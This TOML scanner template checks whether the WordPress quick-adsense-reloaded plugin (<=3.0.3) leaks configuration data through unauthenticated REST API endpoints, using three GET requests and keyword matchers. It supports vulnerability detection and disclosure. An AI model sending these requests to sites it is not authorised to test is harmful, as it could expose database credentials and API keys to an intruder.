[info]
author = "ave"
description = "检测 WordPress quick-adsense-reloaded 插件 <=3.0.3 是否存在未认证 REST API 敏感数据泄露。未经身份验证的攻击者可访问插件 REST API 端点获取数据库配置、API Key 等敏感信息。"
id = "POC-AVE-2026-0102"
name = "WPQuads Ads by WPQuads 插件敏感数据泄露漏洞 PoC"
severity = "high"
tags = ["ave-2026-0102"]
vuln_id = [
    "CVE-2026-54824",
    "AVE-2026-0102",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wp-json/quick-adsense-reloaded/v1/settings"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "quick_adsense_reloaded",
    "qs_settings",
    "quads_options",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wp-json/quick-adsense-reloaded/v1/config"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "quick_adsense_reloaded",
    "qs_settings",
    "quads_options",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wp-json/quick-adsense-reloaded/v1/options"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "quick_adsense_reloaded",
    "qs_settings",
    "quads_options",
]
